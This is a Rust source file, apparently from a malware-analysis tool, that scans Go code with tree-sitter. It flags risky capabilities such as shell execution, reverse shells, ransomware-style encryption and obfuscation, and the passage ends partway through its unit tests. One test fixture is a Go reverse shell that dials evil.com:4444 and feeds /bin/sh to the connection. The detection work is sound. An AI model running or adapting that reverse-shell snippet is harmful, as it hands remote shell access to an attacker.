use crate::analyzers::Analyzer;
use crate::analyzers::{
    comment_metrics::{self, CommentStyle},
    function_metrics::{self, FunctionInfo},
    identifier_metrics, string_metrics, text_metrics,
};
use crate::types::*;
use anyhow::{Context, Result};
use std::cell::RefCell;
use std::fs;
use std::path::Path;
use tree_sitter::Parser;

/// Go analyzer using tree-sitter
pub struct GoAnalyzer {
    parser: RefCell<Parser>,
}

impl GoAnalyzer {
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_go::LANGUAGE.into())
            .unwrap();

        Self {
            parser: RefCell::new(parser),
        }
    }

    fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        // Parse the Go source
        let tree = self
            .parser
            .borrow_mut()
            .parse(content, None)
            .context("Failed to parse Go source")?;

        let root = tree.root_node();

        // Create target info
        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: "go".to_string(),
            size_bytes: content.len() as u64,
            sha256: self.calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Add structural feature
        report.structure.push(StructuralFeature {
            id: "source/language/go".to_string(),
            description: "Go source code".to_string(),
            evidence: vec![Evidence {
                method: "parser".to_string(),
                source: "tree-sitter-go".to_string(),
                value: "go".to_string(),
                location: Some("AST".to_string()),
            }],
        });

        // Detect capabilities and patterns
        self.detect_capabilities(&root, content.as_bytes(), &mut report);

        // Extract functions
        self.extract_functions(&root, content.as_bytes(), &mut report);

        // Detect Go idioms
        let go_idioms = self.detect_go_idioms(&root, content.as_bytes());

        // Add idioms to source code metrics if they exist
        if let Some(ref mut metrics) = report.source_code_metrics {
            metrics.go_idioms = Some(go_idioms);
        }

        // Compute metrics for ML analysis
        let metrics = self.compute_metrics(&root, content);
        report.metrics = Some(metrics);

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec!["tree-sitter-go".to_string()];

        Ok(report)
    }

    /// Compute all metrics for Go code
    fn compute_metrics(&self, root: &tree_sitter::Node, content: &str) -> Metrics {
        let source = content.as_bytes();
        let total_lines = content.lines().count() as u32;

        let text = text_metrics::analyze_text(content);

        let identifiers = self.extract_identifiers(root, source);
        let ident_refs: Vec<&str> = identifiers.iter().map(|s| s.as_str()).collect();
        let identifier_metrics = identifier_metrics::analyze_identifiers(&ident_refs);

        let strings = self.extract_string_literals(root, source);
        let str_refs: Vec<&str> = strings.iter().map(|s| s.as_str()).collect();
        let string_metrics = string_metrics::analyze_strings(&str_refs);

        let comment_metrics = comment_metrics::analyze_comments(content, CommentStyle::CStyle);

        let func_infos = self.extract_function_info(root, source);
        let func_metrics = function_metrics::analyze_functions(&func_infos, total_lines);

        Metrics {
            text: Some(text),
            identifiers: Some(identifier_metrics),
            strings: Some(string_metrics),
            comments: Some(comment_metrics),
            functions: Some(func_metrics),
            ..Default::default()
        }
    }

    fn extract_identifiers(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
        let mut identifiers = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_identifiers(&mut cursor, source, &mut identifiers);
        identifiers
    }

    fn walk_for_identifiers(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        identifiers: &mut Vec<String>,
    ) {
        loop {
            let node = cursor.node();
            if node.kind() == "identifier" || node.kind() == "field_identifier" {
                if let Ok(text) = node.utf8_text(source) {
                    if !text.is_empty() {
                        identifiers.push(text.to_string());
                    }
                }
            }
            if cursor.goto_first_child() {
                self.walk_for_identifiers(cursor, source, identifiers);
                cursor.goto_parent();
            }
            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn extract_string_literals(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
        let mut strings = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_strings(&mut cursor, source, &mut strings);
        strings
    }

    fn walk_for_strings(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        strings: &mut Vec<String>,
    ) {
        loop {
            let node = cursor.node();
            if node.kind() == "interpreted_string_literal" || node.kind() == "raw_string_literal" {
                if let Ok(text) = node.utf8_text(source) {
                    let s = text.trim_start_matches('"').trim_end_matches('"')
                        .trim_start_matches('`').trim_end_matches('`');
                    if !s.is_empty() {
                        strings.push(s.to_string());
                    }
                }
            }
            if cursor.goto_first_child() {
                self.walk_for_strings(cursor, source, strings);
                cursor.goto_parent();
            }
            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn extract_function_info(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<FunctionInfo> {
        let mut functions = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_function_info(&mut cursor, source, &mut functions, 0);
        functions
    }

    fn walk_for_function_info(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        functions: &mut Vec<FunctionInfo>,
        depth: u32,
    ) {
        loop {
            let node = cursor.node();
            let kind = node.kind();

            if kind == "function_declaration" || kind == "method_declaration" {
                let mut info = FunctionInfo::default();
                if let Some(name_node) = node.child_by_field_name("name") {
                    if let Ok(name) = name_node.utf8_text(source) {
                        info.name = name.to_string();
                    }
                }
                // Get parameters
                if let Some(params_node) = node.child_by_field_name("parameters") {
                    let mut param_cursor = params_node.walk();
                    if param_cursor.goto_first_child() {
                        loop {
                            let param = param_cursor.node();
                            if param.kind() == "parameter_declaration" {
                                // Go can have multiple names per declaration
                                let mut inner = param.walk();
                                if inner.goto_first_child() {
                                    loop {
                                        let child = inner.node();
                                        if child.kind() == "identifier" {
                                            info.param_count += 1;
                                            if let Ok(name) = child.utf8_text(source) {
                                                info.param_names.push(name.to_string());
                                            }
                                        }
                                        if !inner.goto_next_sibling() {
                                            break;
                                        }
                                    }
                                }
                            }
                            if !param_cursor.goto_next_sibling() {
                                break;
                            }
                        }
                    }
                }
                info.start_line = node.start_position().row as u32;
                info.end_line = node.end_position().row as u32;
                info.line_count = info.end_line.saturating_sub(info.start_line) + 1;
                info.nesting_depth = depth;
                functions.push(info);
            }

            if cursor.goto_first_child() {
                let new_depth = if kind == "function_declaration" || kind == "method_declaration" {
                    depth + 1
                } else {
                    depth
                };
                self.walk_for_function_info(cursor, source, functions, new_depth);
                cursor.goto_parent();
            }
            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn detect_capabilities(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_ast(&mut cursor, source, report);
    }

    fn walk_ast(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        loop {
            let node = cursor.node();

            match node.kind() {
                "call_expression" => {
                    self.analyze_call(&node, source, report);
                }
                "import_declaration" | "import_spec" => {
                    self.analyze_import(&node, source, report);
                }
                "assignment_statement" | "short_var_declaration" => {
                    self.check_obfuscation(&node, source, report);
                }
                _ => {}
            }

            // Recurse
            if cursor.goto_first_child() {
                self.walk_ast(cursor, source, report);
                cursor.goto_parent();
            }

            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn analyze_call(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            let mut capabilities = Vec::new();

            // Command execution (high priority for malware)
            if text.contains("exec.Command") {
                capabilities.push((
                    "exec/command/shell",
                    "Executes shell commands",
                    "exec.Command",
                    0.95,
                    Criticality::Notable,
                ));
            }
            if text.contains("syscall.Exec") || text.contains("syscall.ForkExec") {
                capabilities.push((
                    "exec/program/direct",
                    "Direct program execution via syscall",
                    "syscall.Exec",
                    0.98,
                    Criticality::Notable,
                ));
            }

            // Reverse shell patterns (critical indicator)
            if (text.contains("net.Dial") || text.contains("net.DialTCP"))
                && (text.contains("exec.Command")
                    || text.contains("/bin/sh")
                    || text.contains("cmd.exe"))
            {
                capabilities.push((
                    "c2/reverse-shell",
                    "Reverse shell connection",
                    "net.Dial+exec",
                    0.98,
                    Criticality::Hostile,
                ));
            }

            // Network operations
            if text.contains("net.Listen") || text.contains("net.ListenTCP") {
                capabilities.push((
                    "net/socket/server",
                    "Network server/listener",
                    "net.Listen",
                    0.9,
                    Criticality::Notable,
                ));
            }
            if text.contains("net.Dial") {
                capabilities.push((
                    "net/socket/create",
                    "Network connection",
                    "net.Dial",
                    0.85,
                    Criticality::Notable,
                ));
            }
            if text.contains("http.Get") || text.contains("http.Post") {
                capabilities.push((
                    "net/http/client",
                    "HTTP client request",
                    "http.Get/Post",
                    0.85,
                    Criticality::Notable,
                ));
            }
            if text.contains("http.ListenAndServe") {
                capabilities.push((
                    "net/http/server",
                    "HTTP server",
                    "http.ListenAndServe",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Crypto operations (ransomware indicators)
            if text.contains("aes.NewCipher") || text.contains("cipher.NewCBCEncrypter") {
                capabilities.push((
                    "crypto/cipher/aes",
                    "AES encryption",
                    "aes.NewCipher",
                    0.9,
                    Criticality::Notable,
                ));
            }
            if text.contains("rsa.EncryptOAEP") || text.contains("rsa.GenerateKey") {
                capabilities.push((
                    "crypto/cipher/rsa",
                    "RSA encryption",
                    "rsa.Encrypt",
                    0.9,
                    Criticality::Notable,
                ));
            }
            // File encryption pattern (crypto + file walking)
            if (text.contains("aes") || text.contains("cipher"))
                && (text.contains("filepath.Walk") || text.contains("ioutil.ReadDir"))
            {
                capabilities.push((
                    "crypto/ransomware/encrypt",
                    "File encryption pattern",
                    "crypto+walk",
                    0.92,
                    Criticality::Hostile,
                ));
            }

            // File operations
            if text.contains("os.Create")
                || text.contains("ioutil.WriteFile")
                || text.contains("os.WriteFile")
            {
                capabilities.push((
                    "fs/write",
                    "Write files",
                    "os.Create/WriteFile",
                    0.8,
                    Criticality::Notable,
                ));
            }
            // Note: fs/file/delete detection moved to traits/fs/file/delete/go.yaml
            if text.contains("filepath.Walk") || text.contains("ioutil.ReadDir") {
                capabilities.push((
                    "fs/enumerate",
                    "File enumeration",
                    "filepath.Walk",
                    0.75,
                    Criticality::Notable,
                ));
            }
            if text.contains("os.Chmod") || text.contains("os.Chown") {
                capabilities.push((
                    "fs/permissions",
                    "Modify file permissions",
                    "os.Chmod",
                    0.85,
                    Criticality::Notable,
                ));
            }

            // Persistence mechanisms
            if text.contains("syscall.Setuid") || text.contains("syscall.Setgid") {
                capabilities.push((
                    "persistence/setuid",
                    "Change user/group ID",
                    "syscall.Setuid",
                    0.95,
                    Criticality::Notable,
                ));
            }
            if text.contains("os.Symlink") {
                capabilities.push((
                    "persistence/symlink",
                    "Create symbolic links",
                    "os.Symlink",
                    0.8,
                    Criticality::Notable,
                ));
            }

            // Process manipulation
            if text.contains("os.FindProcess") || text.contains("syscall.Kill") {
                capabilities.push((
                    "process/manipulate",
                    "Process manipulation",
                    "os.FindProcess",
                    0.85,
                    Criticality::Notable,
                ));
            }
            if text.contains("runtime.SetFinalizer") {
                capabilities.push((
                    "process/lifecycle",
                    "Set finalizer hooks",
                    "runtime.SetFinalizer",
                    0.7,
                    Criticality::Notable,
                ));
            }

            // Reflection/dynamic loading (obfuscation)
            if text.contains("reflect.ValueOf") || text.contains("reflect.Call") {
                capabilities.push((
                    "anti-analysis/reflection",
                    "Reflection/dynamic invocation",
                    "reflect.Call",
                    0.85,
                    Criticality::Notable,
                ));
            }
            if text.contains("plugin.Open") {
                capabilities.push((
                    "exec/dylib/load",
                    "Load plugins at runtime",
                    "plugin.Open",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Unsafe operations (potential exploit primitives)
            if text.contains("unsafe.Pointer") {
                capabilities.push((
                    "unsafe/pointer",
                    "Unsafe pointer operations",
                    "unsafe.Pointer",
                    0.8,
                    Criticality::Notable,
                ));
            }
            if text.contains("syscall.Mmap") || text.contains("syscall.Mprotect") {
                capabilities.push((
                    "unsafe/memory-map",
                    "Memory mapping/protection",
                    "syscall.Mmap",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Obfuscation/encoding
            if text.contains("base64.StdEncoding.DecodeString") {
                capabilities.push((
                    "anti-analysis/obfuscation/base64",
                    "Base64 decoding",
                    "base64.Decode",
                    0.85,
                    Criticality::Suspicious,
                ));
            }
            if text.contains("hex.DecodeString") {
                capabilities.push((
                    "anti-analysis/obfuscation/hex",
                    "Hex decoding",
                    "hex.Decode",
                    0.8,
                    Criticality::Suspicious,
                ));
            }
            if text.contains("gzip.NewReader") || text.contains("zlib.NewReader") {
                capabilities.push((
                    "anti-analysis/obfuscation/compression",
                    "Data decompression",
                    "gzip/zlib",
                    0.75,
                    Criticality::Suspicious,
                ));
            }

            // CGo (can call C code - potential evasion)
            if text.contains("C.") && (text.contains("syscall") || text.contains("unsafe")) {
                capabilities.push((
                    "exec/cgo/unsafe",
                    "CGo with unsafe operations",
                    "cgo+unsafe",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Anti-debugging
            if text.contains("runtime.GOMAXPROCS") || text.contains("runtime.NumGoroutine") {
                capabilities.push((
                    "anti-analysis/environment-check",
                    "Runtime environment checks",
                    "runtime.GOMAXPROCS",
                    0.7,
                    Criticality::Suspicious,
                ));
            }
            if text.contains("ptrace") {
                capabilities.push((
                    "anti-analysis/anti-debug",
                    "Ptrace (debugger detection)",
                    "ptrace",
                    0.95,
                    Criticality::Suspicious,
                ));
            }

            // Container/VM operations (cloud-native malware)
            if text.contains("docker") || text.contains("containerd") {
                capabilities.push((
                    "container/docker",
                    "Docker operations",
                    "docker",
                    0.8,
                    Criticality::Notable,
                ));
            }
            if text.contains("kubernetes") || text.contains("k8s.io") {
                capabilities.push((
                    "container/kubernetes",
                    "Kubernetes API access",
                    "k8s",
                    0.85,
                    Criticality::Notable,
                ));
            }

            // Add all detected capabilities
            for (cap_id, description, pattern, confidence, criticality) in capabilities {
                if !report.findings.iter().any(|c| c.id == cap_id) {
                    report.findings.push(Finding {
                        kind: FindingKind::Capability,
                        trait_refs: vec![],
                        id: cap_id.to_string(),
                        description: description.to_string(),
                        confidence,
                        criticality,
                        mbc: None,
                        attack: None,
                        evidence: vec![Evidence {
                            method: "ast".to_string(),
                            source: "tree-sitter-go".to_string(),
                            value: pattern.to_string(),
                            location: Some(format!("line:{}", node.start_position().row + 1)),
                        }],
                    });
                }
            }
        }
    }

    fn analyze_import(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            // Map Go imports to capabilities
            let suspicious_imports = [
                // Command execution
                ("os/exec", "exec/command/shell", "Shell command execution"),
                ("syscall", "exec/syscall", "Low-level system calls"),
                // Network
                ("net", "net/socket/create", "Network operations"),
                ("net/http", "net/http/client", "HTTP operations"),
                // Crypto (ransomware indicators when combined with file ops)
                ("crypto/aes", "crypto/cipher/aes", "AES encryption"),
                ("crypto/rsa", "crypto/cipher/rsa", "RSA encryption"),
                ("crypto/cipher", "crypto/cipher", "Cryptographic ciphers"),
                ("crypto/rand", "crypto/random", "Cryptographic random"),
                // Reflection/unsafe (obfuscation/evasion)
                (
                    "reflect",
                    "anti-analysis/reflection",
                    "Reflection/introspection",
                ),
                ("unsafe", "unsafe/pointer", "Unsafe memory operations"),
                ("plugin", "exec/dylib/load", "Plugin loading"),
                // Encoding/obfuscation
                (
                    "encoding/base64",
                    "anti-analysis/obfuscation/base64",
                    "Base64 encoding",
                ),
                (
                    "encoding/hex",
                    "anti-analysis/obfuscation/hex",
                    "Hex encoding",
                ),
                (
                    "compress/gzip",
                    "anti-analysis/obfuscation/compression",
                    "Gzip compression",
                ),
                // Container/cloud (cloud-native malware)
                ("docker", "container/docker", "Docker client"),
                ("k8s.io", "container/kubernetes", "Kubernetes client"),
                // Archive (potential droppers)
                ("archive/zip", "data/archive/zip", "ZIP archive handling"),
                ("archive/tar", "data/archive/tar", "TAR archive handling"),
            ];

            for (module, cap_id, description) in suspicious_imports {
                if text.contains(module) && !report.findings.iter().any(|c| c.id == cap_id) {
                    // Higher confidence for dangerous imports
                    let confidence = if cap_id.contains("exec")
                        || cap_id.contains("syscall")
                        || cap_id.contains("crypto/cipher")
                    {
                        0.85
                    } else {
                        0.7
                    };

                    report.findings.push(Finding {
                        kind: FindingKind::Capability,
                        trait_refs: vec![],
                        id: cap_id.to_string(),
                        description: description.to_string(),
                        confidence,
                        criticality: Criticality::Notable,
                        mbc: None,
                        attack: None,
                        evidence: vec![Evidence {
                            method: "import".to_string(),
                            source: "tree-sitter-go".to_string(),
                            value: module.to_string(),
                            location: Some(format!("line:{}", node.start_position().row + 1)),
                        }],
                    });
                }
            }
        }
    }

    fn check_obfuscation(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        if let Ok(text) = node.utf8_text(source) {
            // Detect base64 + exec pattern (common obfuscation)
            if (text.contains("base64") || text.contains("DecodeString"))
                && (text.contains("exec.Command") || text.contains("syscall"))
                && !report
                    .findings
                    .iter()
                    .any(|c| c.id == "anti-analysis/obfuscation/base64-exec")
            {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "anti-analysis/obfuscation/base64-exec".to_string(),
                    description: "Base64 decode followed by exec (obfuscation)".to_string(),
                    confidence: 0.95,
                    criticality: Criticality::Suspicious,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "pattern".to_string(),
                        source: "tree-sitter-go".to_string(),
                        value: "base64+exec".to_string(),
                        location: Some(format!("line:{}", node.start_position().row + 1)),
                    }],
                });
            }

            // Detect hex string construction (obfuscation)
            if text.contains("\\x")
                && text.matches("\\x").count() > 5
                && !report
                    .findings
                    .iter()
                    .any(|c| c.id == "anti-analysis/obfuscation/hex-strings")
            {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "anti-analysis/obfuscation/hex-strings".to_string(),
                    description: "Hex-encoded strings".to_string(),
                    confidence: 0.9,
                    criticality: Criticality::Suspicious,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "pattern".to_string(),
                        source: "tree-sitter-go".to_string(),
                        value: "hex_encoding".to_string(),
                        location: Some(format!("line:{}", node.start_position().row + 1)),
                    }],
                });
            }

            // Detect build tag obfuscation
            if text.contains("// +build")
                && (text.contains("!") || text.contains(","))
                && !report
                    .findings
                    .iter()
                    .any(|c| c.id == "anti-analysis/build-tags")
            {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "anti-analysis/build-tags".to_string(),
                    description: "Conditional build tags (platform evasion)".to_string(),
                    confidence: 0.75,
                    criticality: Criticality::Notable,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "pattern".to_string(),
                        source: "tree-sitter-go".to_string(),
                        value: "build_tags".to_string(),
                        location: Some(format!("line:{}", node.start_position().row + 1)),
                    }],
                });
            }
        }
    }

    /// Calculate cyclomatic complexity for a Go function
    fn calculate_cyclomatic_complexity(&self, node: &tree_sitter::Node, source: &[u8]) -> u32 {
        let mut complexity = 1; // Base complexity
        let mut cursor = node.walk();

        loop {
            let current = cursor.node();
            match current.kind() {
                "if_statement" => complexity += 1,
                "for_statement" => complexity += 1,
                "switch_statement" | "expression_switch_statement" | "type_switch_statement" => {
                    complexity += 1
                }
                "case_clause" => complexity += 1,
                "select_statement" => complexity += 1,
                "binary_expression" => {
                    if let Ok(text) = current.utf8_text(source) {
                        if text.contains("&&") || text.contains("||") {
                            complexity += 1;
                        }
                    }
                }
                _ => {}
            }

            // Traverse
            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return complexity;
                }
            }
        }
    }

    /// Analyze function signature for Go functions
    fn analyze_function_signature(
        &self,
        node: &tree_sitter::Node,
        _source: &[u8],
    ) -> FunctionSignature {
        let mut param_count = 0u32;
        let mut has_return_type = false;
        let _is_method = node.kind() == "method_declaration";

        // Extract parameters
        if let Some(params_node) = node.child_by_field_name("parameters") {
            let mut param_cursor = params_node.walk();
            for child in params_node.children(&mut param_cursor) {
                if child.kind() == "parameter_declaration"
                    || child.kind() == "variadic_parameter_declaration"
                {
                    param_count += 1;
                }
            }
        }

        // Check for return type
        if let Some(_result_node) = node.child_by_field_name("result") {
            has_return_type = true;
        }

        FunctionSignature {
            param_count,
            default_param_count: 0,    // Go doesn't have default parameters
            has_var_positional: false, // Go has variadic params but different semantics
            has_var_keyword: false,
            has_type_hints: true, // Go is statically typed
            has_return_type,
            decorators: Vec::new(), // Go doesn't have decorators
            is_async: false,        // Go uses goroutines, not async/await
            is_generator: false,
            is_lambda: false,
        }
    }

    /// Calculate nesting depth of control structures
    fn calculate_nesting_depth(&self, node: &tree_sitter::Node) -> NestingMetrics {
        let mut max_depth = 0u32;
        let mut depths = Vec::new();
        let mut deep_nest_count = 0u32;

        fn traverse(
            node: &tree_sitter::Node,
            current_depth: u32,
            max: &mut u32,
            depths: &mut Vec<u32>,
            deep: &mut u32,
        ) {
            let mut depth = current_depth;
            match node.kind() {
                "if_statement"
                | "for_statement"
                | "switch_statement"
                | "select_statement"
                | "expression_switch_statement"
                | "type_switch_statement" => {
                    depth += 1;
                    depths.push(depth);
                    if depth > *max {
                        *max = depth;
                    }
                    if depth > 4 {
                        *deep += 1;
                    }
                }
                _ => {}
            }

            // Recurse through children
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                traverse(&child, depth, max, depths, deep);
            }
        }

        traverse(node, 0, &mut max_depth, &mut depths, &mut deep_nest_count);

        NestingMetrics {
            max_depth,
            avg_depth: if !depths.is_empty() {
                depths.iter().sum::<u32>() as f32 / depths.len() as f32
            } else {
                0.0
            },
            deep_nest_count,
        }
    }

    /// Analyze call patterns in Go functions
    fn analyze_call_patterns(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        func_name: &str,
    ) -> CallPatternMetrics {
        let mut call_count = 0u32;
        let mut callees: Vec<String> = Vec::new();
        let mut recursive_calls = 0u32;
        let mut dynamic_calls = 0u32;

        let mut cursor = node.walk();
        loop {
            let current = cursor.node();
            if current.kind() == "call_expression" {
                call_count += 1;

                if let Some(func_node) = current.child_by_field_name("function") {
                    if let Ok(func_text) = func_node.utf8_text(source) {
                        let func_str = func_text.to_string();
                        callees.push(func_str.clone());

                        // Check recursion
                        if func_str == func_name || func_str.ends_with(&format!(".{}", func_name)) {
                            recursive_calls += 1;
                        }

                        // Check dynamic calls (reflect.Call, plugin operations)
                        if func_str.contains("reflect.Call")
                            || func_str.contains("reflect.ValueOf")
                            || func_str.contains("plugin.Open")
                        {
                            dynamic_calls += 1;
                        }
                    }
                }
            }

            // Traverse
            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    callees.sort();
                    callees.dedup();

                    return CallPatternMetrics {
                        call_count,
                        unique_callees: callees.len() as u32,
                        chained_calls: 0, // Go doesn't use method chaining as much
                        max_chain_length: 0,
                        recursive_calls,
                        dynamic_calls,
                    };
                }
            }
        }
    }

    /// Detect Go-specific idioms
    fn detect_go_idioms(&self, root: &tree_sitter::Node, source: &[u8]) -> GoIdioms {
        let mut goroutine_count = 0u32;
        let mut channel_count = 0u32;
        let mut defer_count = 0u32;
        let mut select_statement_count = 0u32;
        let mut type_assertion_count = 0u32;
        let mut method_count = 0u32;
        let mut interface_count = 0u32;
        let mut range_loop_count = 0u32;
        let mut error_return_count = 0u32;
        let mut panic_recover_count = 0u32;
        let mut cgo_count = 0u32;
        let mut unsafe_count = 0u32;

        let mut cursor = root.walk();
        loop {
            let node = cursor.node();
            match node.kind() {
                "go_statement" => {
                    goroutine_count += 1;
                }
                "channel_type" | "send_statement" | "receive_statement" => {
                    channel_count += 1;
                }
                "defer_statement" => {
                    defer_count += 1;
                }
                "select_statement" => {
                    select_statement_count += 1;
                }
                "type_assertion_expression" => {
                    type_assertion_count += 1;
                }
                "method_declaration" => {
                    method_count += 1;
                }
                "interface_type" => {
                    interface_count += 1;
                }
                "range_clause" => {
                    range_loop_count += 1;
                }
                "function_declaration" => {
                    // Check for error return type
                    if let Some(result) = node.child_by_field_name("result") {
                        if let Ok(text) = result.utf8_text(source) {
                            if text.contains("error") {
                                error_return_count += 1;
                            }
                        }
                    }
                }
                "call_expression" => {
                    if let Ok(text) = node.utf8_text(source) {
                        if text.contains("panic") || text.contains("recover") {
                            panic_recover_count += 1;
                        }
                        if text.contains("unsafe.Pointer") || text.contains("unsafe.Sizeof") {
                            unsafe_count += 1;
                        }
                    }
                }
                "import_spec" => {
                    if let Ok(text) = node.utf8_text(source) {
                        if text.contains("\"C\"") {
                            cgo_count += 1;
                        }
                    }
                }
                _ => {}
            }

            // Traverse
            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return GoIdioms {
                        goroutine_count,
                        channel_count,
                        defer_count,
                        select_statement_count,
                        type_assertion_count,
                        method_count,
                        interface_count,
                        range_loop_count,
                        error_return_count,
                        panic_recover_count,
                        cgo_count,
                        unsafe_count,
                    };
                }
            }
        }
    }

    fn extract_functions(
        &self,
        root: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = root.walk();

        loop {
            let node = cursor.node();

            if node.kind() == "function_declaration" || node.kind() == "method_declaration" {
                if let Some(name_node) = node.child_by_field_name("name") {
                    if let Ok(func_name) = name_node.utf8_text(source) {
                        let func_name_str = func_name.to_string();

                        // Calculate all metrics
                        let complexity = self.calculate_cyclomatic_complexity(&node, source);
                        let signature = self.analyze_function_signature(&node, source);
                        let nesting = self.calculate_nesting_depth(&node);
                        let call_patterns =
                            self.analyze_call_patterns(&node, source, &func_name_str);

                        // Extract function calls
                        let mut calls = Vec::new();
                        let mut call_cursor = node.walk();
                        loop {
                            let call_node = call_cursor.node();
                            if call_node.kind() == "call_expression" {
                                if let Some(func_node) = call_node.child_by_field_name("function") {
                                    if let Ok(func_text) = func_node.utf8_text(source) {
                                        calls.push(func_text.to_string());
                                    }
                                }
                            }
                            if call_cursor.goto_first_child() {
                                continue;
                            }
                            loop {
                                if call_cursor.goto_next_sibling() {
                                    break;
                                }
                                if !call_cursor.goto_parent() {
                                    break;
                                }
                            }
                            if call_cursor.node() == node {
                                break;
                            }
                        }
                        calls.sort();
                        calls.dedup();

                        // Build control flow metrics
                        let control_flow = ControlFlowMetrics {
                            basic_blocks: complexity,
                            edges: if complexity > 1 { complexity + 1 } else { 1 },
                            cyclomatic_complexity: complexity,
                            max_block_size: 0,
                            avg_block_size: 0.0,
                            is_linear: complexity == 1,
                            loop_count: 0,
                            branch_density: 0.0,
                            in_degree: 0,
                            out_degree: call_patterns.unique_callees,
                        };

                        // Build properties
                        let properties = FunctionProperties {
                            is_pure: false,
                            is_noreturn: false,
                            is_recursive: call_patterns.recursive_calls > 0,
                            stack_frame: 0,
                            local_vars: 0,
                            args: signature.param_count,
                            is_leaf: call_patterns.call_count == 0,
                        };

                        report.functions.push(Function {
                            name: func_name_str,
                            offset: Some(format!("line:{}", node.start_position().row + 1)),
                            size: Some((node.end_byte() - node.start_byte()) as u64),
                            complexity: Some(complexity),
                            calls,
                            source: "tree-sitter-go".to_string(),
                            control_flow: Some(control_flow),
                            instruction_analysis: None,
                            register_usage: None,
                            constants: Vec::new(),
                            properties: Some(properties),
                            signature: Some(signature),
                            nesting: Some(nesting),
                            call_patterns: Some(call_patterns),
                        });
                    }
                }
            }

            // Recurse
            if cursor.goto_first_child() {
                continue;
            }

            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return;
                }
            }
        }
    }

    fn calculate_sha256(&self, data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        format!("{:x}", hasher.finalize())
    }
}

impl Default for GoAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

impl Analyzer for GoAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let content = fs::read_to_string(file_path).context("Failed to read Go source file")?;

        self.analyze_source(file_path, &content)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        if let Some(ext) = file_path.extension() {
            ext == "go"
        } else {
            false
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn analyze_go_code(code: &str) -> AnalysisReport {
        let analyzer = GoAnalyzer::new();
        let path = PathBuf::from("test.go");
        analyzer.analyze_source(&path, code).unwrap()
    }

    #[test]
    fn test_detect_exec_command() {
        let code = r#"
package main
import "os/exec"
func main() {
    cmd := exec.Command("ls", "-la")
    cmd.Run()
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_syscall_exec() {
        let code = r#"
package main
import "syscall"
func main() {
    syscall.Exec("/bin/sh", []string{}, nil)
}
"#;
        let report = analyze_go_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "exec/program/direct"));
    }

    #[test]
    fn test_detect_reverse_shell() {
        let code = r#"
package main
import ("net"; "os/exec")
func main() {
    conn, _ := net.Dial("tcp", "evil.com:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
}
"#;
        let report = analyze_go_code(code);
        // Should detect at least net.Dial and exec.Command
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_net_listen() {
        let code = r#"
package main
import "net"
func main() {
    ln, _ := net.Listen("tcp", ":8080")
}
"#;
        let report = analyze_go_code(code);
